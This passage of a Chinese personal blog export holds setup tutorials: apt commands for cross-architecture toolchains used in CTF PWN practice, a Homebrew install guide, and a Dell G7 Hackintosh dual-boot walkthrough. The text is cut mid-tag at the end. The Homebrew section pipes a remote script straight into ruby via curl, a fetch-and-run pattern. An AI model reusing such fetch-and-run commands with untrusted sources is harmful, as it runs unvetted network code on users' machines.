install gcc-x86-64-linux-gnux32 g++-x86-64-linux-gnux32 libc6-x32-cross libc6-dbg-x32-cross binutils-x86-64-linux-gnux32</span><br></pre></td></tr></table></figure><h3 id="riscv64">riscv64</h3><h4 id="riscv64-小端序-64-位">riscv64 小端序 64 位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-riscv64-linux-gnu g++-riscv64-linux-gnu libc6-riscv64-cross libc6-dbg-riscv64-cross binutils-riscv64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="ia64">ia64</h3><h4 id="ia64-小端序-64-位">ia64 小端序 64 位</h4><p>只有类似 readelf 和 objdump 这种工具可以用，莫得 libc 和 gcc 以及 g++</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install binutils-ia64-linux-gnu</span><br></pre></td></tr></table></figure><h2 id="跨平台配置命令合集">跨平台配置命令合集</h2><h3 id="适用于-Ubuntu-20-04">适用于 Ubuntu 20.04</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y \</span><br><span class="line">gcc-mipsel-linux-gnu g++-mipsel-linux-gnu libc6-mipsel-cross binutils-mipsel-linux-gnu \</span><br><span class="line">gcc-mips-linux-gnu g++-mips-linux-gnu libc6-mips-cross binutils-mips-linux-gnu \</span><br><span class="line">gcc-mips64el-linux-gnuabi64 g++-mips64el-linux-gnuabi64 libc6-mips64el-cross binutils-mips64el-linux-gnuabi64 \</span><br><span class="line">gcc-mips64-linux-gnuabi64 g++-mips64-linux-gnuabi64 libc6-mips64-cross binutils-mips64-linux-gnuabi64 \</span><br><span class="line">gcc-mipsisa32r6el-linux-gnu g++-mipsisa32r6el-linux-gnu libc6-mipsr6el-cross binutils-mipsisa32r6el-linux-gnu \</span><br><span class="line">gcc-mipsisa32r6-linux-gnu g++-mipsisa32r6-linux-gnu libc6-mipsr6-cross libc6-mipsr6-cross binutils-mipsisa32r6-linux-gnu \</span><br><span class="line">gcc-arm-linux-gnueabi g++-arm-linux-gnueabi libc6-armel-cross libc6-dbg-armel-cross binutils-arm-linux-gnueabi \</span><br><span class="line">gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf libc6-armhf-cross libc6-dbg-armhf-cross binutils-arm-linux-gnueabi \</span><br><span class="line">gcc-aarch64-linux-gnu g++-aarch64-linux-gnu libc6-arm64-cross libc6-dbg-arm64-cross binutils-aarch64-linux-gnu \</span><br><span class="line">gcc-hppa-linux-gnu g++-hppa-linux-gnu libc6-hppa-cross libc6-dbg-hppa-cross binutils-hppa-linux-gnu \</span><br><span class="line">gcc-hppa64-linux-gnu binutils-hppa64-linux-gnu \</span><br><span class="line">gcc-m68k-linux-gnu g++-m68k-linux-gnu libc6-m68k-cross libc6-dbg-m68k-cross binutils-m68k-linux-gnu \</span><br><span class="line">gcc-powerpc-linux-gnu g++-powerpc-linux-gnu libc6-powerpc-cross libc6-dbg-powerpc-cross binutils-powerpc-linux-gnu \</span><br><span class="line">gcc-powerpc64-linux-gnu g++-powerpc64-linux-gnu libc6-ppc64-cross libc6-dbg-ppc64-cross binutils-powerpc64-linux-gnu \</span><br><span class="line">gcc-powerpc64le-linux-gnu g++-powerpc64le-linux-gnu libc6-ppc64el-cross libc6-dbg-ppc64el-cross binutils-powerpc64le-linux-gnu \</span><br><span class="line">gcc-s390x-linux-gnu g++-s390x-linux-gnu libc6-s390x-cross libc6-dbg-s390x-cross binutils-s390x-linux-gnu \</span><br><span class="line">gcc-sh4-linux-gnu g++-sh4-linux-gnu libc6-sh4-cross libc6-dbg-sh4-cross binutils-sh4-linux-gnu \</span><br><span class="line">gcc-sparc64-linux-gnu g++-sparc64-linux-gnu libc6-dbg-sparc64-cross \</span><br><span class="line">gcc-alpha-linux-gnu g++-alpha-linux-gnu libc6.1-alpha-cross libc6.1-dbg-alpha-cross binutils-alpha-linux-gnu \</span><br><span class="line">gcc-i686-linux-gnu g++-i686-linux-gnu libc6-i386-cross libc6-dbg-i386-cross binutils-i686-linux-gnu \</span><br><span class="line">gcc-x86-64-linux-gnux32 g++-x86-64-linux-gnux32 libc6-x32-cross libc6-dbg-x32-cross binutils-x86-64-linux-gnux32 \</span><br><span class="line">gcc-riscv64-linux-gnu g++-riscv64-linux-gnu libc6-riscv64-cross libc6-dbg-riscv64-cross binutils-riscv64-linux-gnu \</span><br><span class="line">binutils-ia64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="适用于-Ubuntu-18-04">适用于 Ubuntu 18.04</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y \</span><br><span class="line">gcc-mipsel-linux-gnu g++-mipsel-linux-gnu libc6-mipsel-cross binutils-mipsel-linux-gnu \</span><br><span class="line">gcc-mips-linux-gnu g++-mips-linux-gnu libc6-mips-cross binutils-mips-linux-gnu \</span><br><span class="line">gcc-mips64el-linux-gnuabi64 g++-mips64el-linux-gnuabi64 libc6-mips64el-cross binutils-mips64el-linux-gnuabi64 \</span><br><span class="line">gcc-mips64-linux-gnuabi64 g++-mips64-linux-gnuabi64 libc6-mips64-cross binutils-mips64-linux-gnuabi64 \</span><br><span class="line">libc6-mipsr6el-cross binutils-mipsisa32r6el-linux-gnu \</span><br><span class="line">libc6-mipsr6-cross libc6-mipsr6-cross binutils-mipsisa32r6-linux-gnu \</span><br><span class="line">gcc-arm-linux-gnueabi g++-arm-linux-gnueabi libc6-armel-cross libc6-dbg-armel-cross binutils-arm-linux-gnueabi \</span><br><span class="line">gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf libc6-armhf-cross libc6-dbg-armhf-cross binutils-arm-linux-gnueabi \</span><br><span class="line">gcc-aarch64-linux-gnu g++-aarch64-linux-gnu libc6-arm64-cross libc6-dbg-arm64-cross binutils-aarch64-linux-gnu \</span><br><span class="line">gcc-hppa-linux-gnu g++-hppa-linux-gnu libc6-hppa-cross libc6-dbg-hppa-cross binutils-hppa-linux-gnu \</span><br><span class="line">gcc-hppa64-linux-gnu binutils-hppa64-linux-gnu \</span><br><span class="line">gcc-m68k-linux-gnu g++-m68k-linux-gnu libc6-m68k-cross libc6-dbg-m68k-cross binutils-m68k-linux-gnu \</span><br><span class="line">gcc-powerpc-linux-gnu g++-powerpc-linux-gnu libc6-powerpc-cross libc6-dbg-powerpc-cross binutils-powerpc-linux-gnu \</span><br><span class="line">gcc-powerpc64-linux-gnu g++-powerpc64-linux-gnu libc6-ppc64-cross libc6-dbg-ppc64-cross binutils-powerpc64-linux-gnu \</span><br><span class="line">gcc-powerpc64le-linux-gnu g++-powerpc64le-linux-gnu libc6-ppc64el-cross libc6-dbg-ppc64el-cross binutils-powerpc64le-linux-gnu \</span><br><span class="line">gcc-s390x-linux-gnu g++-s390x-linux-gnu libc6-s390x-cross libc6-dbg-s390x-cross binutils-s390x-linux-gnu \</span><br><span class="line">gcc-sh4-linux-gnu g++-sh4-linux-gnu libc6-sh4-cross libc6-dbg-sh4-cross binutils-sh4-linux-gnu \</span><br><span class="line">gcc-sparc64-linux-gnu g++-sparc64-linux-gnu libc6-dbg-sparc64-cross \</span><br><span class="line">gcc-alpha-linux-gnu g++-alpha-linux-gnu libc6.1-alpha-cross libc6.1-dbg-alpha-cross binutils-alpha-linux-gnu \</span><br><span class="line">gcc-i686-linux-gnu g++-i686-linux-gnu libc6-i386-cross libc6-dbg-i386-cross binutils-i686-linux-gnu \</span><br><span class="line">gcc-x86-64-linux-gnux32 g++-x86-64-linux-gnux32 libc6-x32-cross libc6-dbg-x32-cross binutils-x86-64-linux-gnux32 \</span><br><span class="line">gcc-riscv64-linux-gnu g++-riscv64-linux-gnu libc6-riscv64-cross libc6-dbg-riscv64-cross binutils-riscv64-linux-gnu \</span><br><span class="line">binutils-ia64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="适用于-Kali-Linux">适用于 Kali Linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y \</span><br><span class="line">gcc-mipsel-linux-gnu g++-mipsel-linux-gnu libc6-mipsel-cross binutils-mipsel-linux-gnu \</span><br><span class="line">gcc-mips-linux-gnu g++-mips-linux-gnu libc6-mips-cross binutils-mips-linux-gnu \</span><br><span class="line">gcc-mips64el-linux-gnuabi64 g++-mips64el-linux-gnuabi64 libc6-mips64el-cross binutils-mips64el-linux-gnuabi64 \</span><br><span class="line">gcc-mips64-linux-gnuabi64 g++-mips64-linux-gnuabi64 libc6-mips64-cross binutils-mips64-linux-gnuabi64 \</span><br><span class="line">gcc-mipsisa32r6el-linux-gnu g++-mipsisa32r6el-linux-gnu libc6-mipsr6el-cross binutils-mipsisa32r6el-linux-gnu \</span><br><span class="line">gcc-mipsisa32r6-linux-gnu g++-mipsisa32r6-linux-gnu libc6-mipsr6-cross libc6-mipsr6-cross binutils-mipsisa32r6-linux-gnu \</span><br><span class="line">gcc-arm-linux-gnueabi g++-arm-linux-gnueabi libc6-armel-cross  binutils-arm-linux-gnueabi \</span><br><span class="line">gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf libc6-armhf-cross  binutils-arm-linux-gnueabi \</span><br><span class="line">gcc-aarch64-linux-gnu g++-aarch64-linux-gnu libc6-arm64-cross  binutils-aarch64-linux-gnu \</span><br><span class="line">gcc-hppa-linux-gnu g++-hppa-linux-gnu libc6-hppa-cross  binutils-hppa-linux-gnu \</span><br><span class="line">gcc-hppa64-linux-gnu binutils-hppa64-linux-gnu \</span><br><span class="line">gcc-m68k-linux-gnu g++-m68k-linux-gnu libc6-m68k-cross  binutils-m68k-linux-gnu \</span><br><span class="line">gcc-powerpc-linux-gnu g++-powerpc-linux-gnu libc6-powerpc-cross  binutils-powerpc-linux-gnu \</span><br><span class="line">gcc-powerpc64-linux-gnu g++-powerpc64-linux-gnu libc6-ppc64-cross  binutils-powerpc64-linux-gnu \</span><br><span class="line">gcc-powerpc64le-linux-gnu g++-powerpc64le-linux-gnu libc6-ppc64el-cross  binutils-powerpc64le-linux-gnu \</span><br><span class="line">gcc-s390x-linux-gnu g++-s390x-linux-gnu libc6-s390x-cross  binutils-s390x-linux-gnu \</span><br><span class="line">gcc-sh4-linux-gnu g++-sh4-linux-gnu libc6-sh4-cross  binutils-sh4-linux-gnu \</span><br><span class="line">gcc-sparc64-linux-gnu g++-sparc64-linux-gnu  \</span><br><span class="line">gcc-alpha-linux-gnu g++-alpha-linux-gnu libc6.1-alpha-cross  binutils-alpha-linux-gnu \</span><br><span class="line">gcc-i686-linux-gnu g++-i686-linux-gnu libc6-i386-cross  binutils-i686-linux-gnu \</span><br><span class="line">gcc-x86-64-linux-gnux32 g++-x86-64-linux-gnux32 libc6-x32-cross  binutils-x86-64-linux-gnux32 \</span><br><span class="line">gcc-riscv64-linux-gnu g++-riscv64-linux-gnu libc6-riscv64-cross  binutils-riscv64-linux-gnu \</span><br><span class="line">binutils-ia64-linux-gnu</span><br></pre></td></tr></table></figure><h2 id="参考文章">参考文章</h2><p><a href="https://binlep.github.io/2020/03/20/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%9E%B6%E6%9E%84%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%B0%83%E8%AF%95/">跨平台架构的环境配置与调试 | binLep’s Blog</a><br><a href="https://bbs.pediy.com/thread-258437.htm">ubuntu18 安装各种 pwn 工具-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a><br><a href="https://a1ex.online/2020/10/09/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">mips pwn 环境搭建 | A1ex’s Blog</a><br><a href="https://nocbtm.github.io/2020/01/21/arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">arm pwn 环境搭建 | nocbtm’s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS安装Homebrew教程</title>
      <link href="/posts/94633aa6/"/>
      <url>/posts/94633aa6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p><strong>Homebrew是什么？</strong></p><p>Homebrew是“MacOS缺失的软件包管理器”，用来安装Mac没有预装但<a href="https://formulae.brew.sh/formula/">你需要的东西</a>。</p><h2 id="安装">安装</h2><h3 id="官网安装法">官网安装法</h3><p>进入<a href="https://brew.sh/index_zh-cn.html">官网</a>，安装步骤介绍的很详细：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210213151302997.png" alt="image-20210213151302997"></p><h4 id="安装命令"><strong>安装命令</strong></h4><p>打开终端，粘贴以下命令:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e <span class="string">&quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span></span><br></pre></td></tr></table></figure><p>脚本会在执行前暂停，并说明将它将做什么。高级安装选项在 <a href="https://docs.brew.sh/Installation">这里</a>(required for OS X 10.8 Mountain Lion and below)。<br>Homebrew 会将软件包安装到独立目录，并将其文件软链接至 /usr/local 。</p><h4 id="检查是否有冲突"><strong>检查是否有冲突</strong></h4><p>安装完成后，检查是否有冲突</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew doctor</span><br></pre></td></tr></table></figure><h4 id="卸载Homebrew"><strong>卸载Homebrew</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="换国内源安装">换国内源安装</h3><p><strong>考虑到官网安装方法太慢，于是我们采用第二种方法</strong></p><h4 id="获取brew-install文件"><strong>获取brew_install文件</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install &gt;&gt; brew_install</span><br></pre></td></tr></table></figure><h4 id="编辑brew-install文件"><strong>编辑brew_install文件</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#BREW_REPO = &quot;https://github.com/Homebrew/brew&quot;.freeze</span></span><br><span class="line">BREW_REPO = <span class="string">&quot;git://mirrors.ustc.edu.cn/brew.git&quot;</span>.freeze</span><br></pre></td></tr></table></figure><h4 id="安装brew"><strong>安装brew</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby ./brew_install</span><br></pre></td></tr></table></figure><h4 id="出现下面代码直接关闭终端"><strong>出现下面代码直接关闭终端</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">==&gt; Tapping homebrew/core</span><br><span class="line">Cloning into <span class="string">&#x27;/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core&#x27;</span>...</span><br></pre></td></tr></table></figure><h4 id="执行下面这句命令，更换为中科院的镜像："><strong>执行下面这句命令，更换为中科院的镜像：</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://mirrors.ustc.edu.cn/homebrew-core.git/ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core --depth=1</span><br></pre></td></tr></table></figure><p><strong>此刻就已经下载成功了</strong></p><h4 id="替换源"><strong>替换源</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="subst">$(brew --repo)</span>&quot;</span></span><br><span class="line">git remote set-url origin git://mirrors.ustc.edu.cn/brew.git</span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="subst">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core&quot;</span></span><br><span class="line">git remote set-url origin git://mirrors.ustc.edu.cn/homebrew-core.git</span><br><span class="line"><span class="comment">#默认不安装cask 有需要的可以替换</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="subst">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-cask&quot;</span></span><br><span class="line">git remote set-url origin git://mirrors.ustc.edu.cn/homebrew-cask.git</span><br></pre></td></tr></table></figure><h4 id="brew-更新"><strong>brew 更新</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br></pre></td></tr></table></figure><h4 id="替换bintray镜像"><strong>替换bintray镜像</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.bash_profile</span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> macOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> macOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DELL G7 15 7588 安装 macOS &amp;Windows教程</title>
      <link href="/posts/install-hackintosh/"/>
      <url>/posts/install-hackintosh/</url>
      
        <content type="html"><![CDATA[<h2 id="电脑配置"><strong>电脑配置</strong></h2><table><thead><tr><th>规格</th><th>详细信息</th></tr></thead><tbody><tr><td>电脑型号</td><td>戴尔 G7 7588 笔记本电脑</td></tr><tr><td>操作系统</td><td>Windows 10 专业版 64位</td></tr><tr><td>处理器</td><td>英特尔 Core i7-8750H @ 2.20GHz 六核</td></tr><tr><td>主板</td><td>戴尔 0FDMYT ( HM370 芯片组 )</td></tr><tr><td>内存</td><td>16 GB ( 英睿达 DDR4 2666MHz )</td></tr><tr><td>主硬盘</td><td>西数 WDS100T3X0C-00SJG0 ( 1 TB / 固态硬盘 )</td></tr><tr><td>显卡</td><td>Nvidia GeForce GTX 1060 with Max-Q Design ( 6 GB )</td></tr><tr><td>显示器</td><td>LG LGD0540 ( 15.5 英寸  )</td></tr><tr><td>声卡</td><td>瑞昱  @ 英特尔 High Definition Audio 控制器</td></tr><tr><td>网卡</td><td>鈺硕 Killer e2400 Gigabit Ethernet Controller / 戴尔</td></tr><tr><td>将安装系统</td><td>macOS Mojave 10.14.6</td></tr></tbody></table><p>❗：本机器的内存、硬盘以及无线网卡(1820A)均手动升级过，具体配置请以自己的机器为准。</p><p><code>Q：</code>也许有人会问为什么不安装macOS Catalina 10.15呢？<code>A：</code>其实并不是Catalina不好，主要因为Catalina砍掉了32位应用程序，有的32位应用还是需要使用到的，其次这个Clover在Catalina下优化的并不怎么好，属实有点卡顿，不够流畅</p><h2 id="安装准备"><strong>安装准备</strong></h2><p>❗❗❗ 以下教程会抹掉整个硬盘的数据，请提前做好备份</p><ul><li>Windows操作系统</li><li>USB无线网卡（Intel的无线网卡截止到无解，喜欢拆机折腾的可以直接换网卡型号：DW1560/DW1820）</li><li>16GB USB3.1 U盘*2 （一个用来做Mac安装盘，一个做Windows安装盘，务必保证大于8GB）</li><li><a href="https://www.balena.io/etcher/">balenaEtcher</a>磁盘写入工具</li><li><a href="http://www.diskgenius.cn">diskgenius</a>磁盘工具</li><li><a href="https://blog.daliansky.net/macOS-Mojave-10.14.6-18G87-Release-version-with-Clover-5033-original-image.html">macOS Mojave 10.14.6(18G103)</a> 正式版原版镜像</li><li><a href="https://www.microsoft.com/zh-cn/software-download/windows10">Windows 10下载工具</a></li><li><a href="https://github.com/ollyhsu/Dell-G7-7588-Hackintosh">戴尔G7 7588 专用Clover</a></li></ul><h2 id="安装时长">安装时长</h2><ul><li>下载镜像文件（Mac &amp; Win）并制作启动U盘  约 30分钟到40分钟</li><li>安装Mac 约30分钟（使用3.1的U盘速度差不多这个速度，2.0的安装会很慢的）</li><li>安装Win 约30分钟（主要是小娜自己要折腾半天）</li><li>合计约2h+</li></ul><h2 id="环境配置">环境配置</h2><p><strong>1、制作Mac安装盘（第一个U盘）</strong></p><ul><li><p>打开balenaEtcher</p></li><li><p>点击 <code>Select image</code> 打开macOS Mojave 10.14.6(18G87)的镜像</p></li><li><p>点击 <code>Select drive</code> 选择第一个U盘</p></li><li><p>点击 <code>Flash</code> 即可</p></li><li><p>大概要等待<strong>15分钟</strong>左右~</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/balenaEtcher.png" alt="balenaEtcher"></p></li><li><p>制作完成后，不要理会windows的格式化提示</p></li><li><p>打开DiskGenius，选择U盘</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/DiskGenius_01.png" alt="DiskGenius_01"></p></li><li><p>依次点击 <code>ESP分区</code>、<code>浏览文件</code>、<code>EFI</code>文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/DiskGenius_02.png" alt="DiskGenius_02"></p></li><li><p>打开下载的<code>戴尔G7 7588专用Clover</code>&gt;<code>EFI-lenovoAir-IKB</code>&gt;<code>EFI</code></p></li><li><p>将DiskGenius中<code>EFI</code>文件夹的所有文件替换为<code>戴尔G7 7588专用Clover</code>&gt;<code>EFI-lenovoAir-IKB</code>&gt;<code>EFI</code>的文件</p></li><li><p>Mac安装盘制作完毕，弹出U盘</p></li></ul><p><strong>2、制作Win安装盘（第二个U盘）</strong></p><ul><li><p>打开Win10安装工具,按下图操作</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/image-20210119171648429.png" alt="image-20210119171648429"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/image-20210119171802128.png" alt="image-20210119171802128"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/image-20210119171902859.png" alt="image-20210119171902859"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/image-20210119171943772.png" alt="image-20210119171943772"></p></li><li><p>等待U盘制作完成，弹出U盘</p></li></ul><h2 id="安装Mac系统">安装Mac系统</h2><p>开机，按F12选择U盘引导，左右选择苹果的图标，按enter键，进入然后会上下滚动一段英文日志信息（大概5-6分钟左右，如果卡住，请确认替换的Clover适合您的电脑）</p><p>进入苹果加载页面</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_logo.png" alt="macOS_logo"></p><p>加载完毕后,按下图操作</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install_Language.png" alt="macOS_Install_Language"></p><p>点击进去之后先在上方菜单栏内找到 <code>终端</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install_Terminal.png" alt="macOS_Install_Terminal"></p><p>打开终端后输入 <code>date 122320122015.06</code> 设置系统时间</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install_Terminal_Date.png" alt="macOS_Install_Terminal_Date"></p><p>否则直接安装macOS会出现提示应用程序副本已损坏的错误</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/image-20210119172845414.png" alt="image-20210119172845414"></p><p>退出终端后，再去进行分区处理。</p><p>点击 <code>磁盘工具</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install_2.png" alt="macOS_Install_2"></p><p>选择 <code>显示所有设备</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install_3.png" alt="macOS_Install_3"></p><p>找到你需要安装macOS系统的分区,后抹掉，改下分区名为Mojave吧</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install_4.png" alt="macOS_Install_4"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install_5.png" alt="macOS_Install_5"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install_6.png" alt="macOS_Install_6"></p><p>接下来，我们要新建一个空分区，方便我们后续安装Win10操作系统</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Win10_disk.png" alt="macOS_Win10_disk"></p><p>进入分区管理界面，单击下面的 ➕</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Win10_disk2.png" alt="macOS_Win10_disk2"></p><p>设置分区名为Win10，格式选ExFAT，千万不要去选macOS扩展（日志式）</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Win10_disk3.png" alt="macOS_Win10_disk3"></p><p>点击应用后再点击<code>分区</code>，然后等待操作结束，退出磁盘工具</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Win10_disk4.png" alt="macOS_Win10_disk4"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Win10_disk5.png" alt="macOS_Win10_disk5"></p><p>好了，到此为止，所有的安装准备都做好了，接下来就可以进行正式安装macOS</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/macOS_Install01.png" alt="macOS_Install01"></p><p>接下来都是继续或者同意。相信凭你的聪明才智这难不倒你的。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/WdVQJU-202003241444-fbpVLH.png" alt="WdVQJU-202003241444-fbpVLH"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/p321SI-202003241445-g8lVx1.png" alt="p321SI-202003241445-g8lVx1"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/rGwrjH-202003241446-4HB930.png" alt="rGwrjH-202003241446-4HB930"></p><p>选择刚刚分区好的Mojave分区（macOS扩展（日志式）格式）去安装macOS系统</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/B9lZQW-202003241531-kmK8Es.png" alt="B9lZQW-202003241531-kmK8Es"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/g1Du1c-202003241532-TO2Y1M.png" alt="g1Du1c-202003241532-TO2Y1M"></p><p>它会把USB安装盘上的安装文件预复制到要安装的系统分区里，这个过程通常会持续1-2分钟</p><p>等待系统将安装程序复制到硬盘内，完成之后会自动重启。重启一定要选从U盘引导，因为你的Clover目前还在U盘内，建议在启动顺序内将U盘启动设置为第一启动顺序</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/image-20210119192342503.png" alt="image-20210119192342503"></p><ul><li>重启引导的时候记得要选择第二个苹果图标Boot install from XXX（你的分区名，图片是以前的有点小误差）</li><li>第一个是从U盘引导安装，第二个是从硬盘安装</li><li>如果你使用的和我一样的EFI，那么这里会自动选择，或者你将U盘拔下就不会出错了。</li><li>然后最后一次重启是只有一个苹果，下面有安装进度条，这个时候就可以去找一部电影看看了</li><li>半小时候再回来~</li><li>安装很慢的…慢慢等吧…</li></ul><p><img 